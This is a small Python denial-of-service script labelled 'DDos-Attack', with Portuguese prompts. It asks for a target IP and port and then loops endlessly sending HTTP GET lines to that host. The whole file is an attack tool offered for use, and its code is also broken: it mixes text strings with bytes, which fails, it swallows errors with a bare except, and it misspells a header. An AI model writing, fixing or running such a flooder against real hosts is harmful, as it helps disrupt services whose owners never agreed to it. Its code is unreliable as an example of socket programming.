import socket

print("""
 DDos-Attack
 *  
  * * *
   *    
     * *  
   * *
       * 
**         
           
  *        
  youtube channel: ch33ch
Powered by: koda/ch33ch/destruction/zero x ...\n\n""")

tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = input("IP >>> ").strip()

try:
    port = int(input("Porta >>> "))
except ValueError:
    print("Use somente número na porta!!")
    exit()

try:
    tcp_socket.connect((ip, port))
    tcp_socket.settimeout(1)
except Exception as error:
    print(f"Erro ao se conectar: {error}")

while True:
    try:
    
        tcp_socket.sendto("GET /" + ip + "HTTP/1.1\r\n".encode('ascii'), (ip, port))
        tcp_socket.sendto("Hots: " + "182.30.33" + "\r\n\r\n".encode("ascii"), (ip, port))
        print(f"C4OS\033[31m({ip}//{port})\033[0m :<>> PACOTE ENVIADO")
    
    except:
        tcp_socket.connect((ip, port))
        tcp_socket.settimeout(2)
